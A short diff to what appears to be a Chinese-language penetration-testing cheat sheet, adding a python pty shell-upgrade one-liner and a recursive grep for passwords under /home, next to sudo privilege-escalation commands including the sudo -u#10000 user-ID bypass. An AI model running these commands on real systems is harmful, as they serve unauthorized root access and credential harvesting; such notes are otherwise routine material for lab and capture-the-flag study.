@@ -14,6 +14,12 @@ sudo -l
 sudo -u jack /bin/bash
 sudo -u#10000 /bin/bash
 
+### 修改交互更好的bash环境
+python -c "import pty;pty.spawn('/bin/bash')"
+
+### 搜索
+grep -R -i pass /home/* 2>dev/null
+
 ### sudo -u提权
 sudo -V | grep version 
 'Sudo version 1.7.4p4'
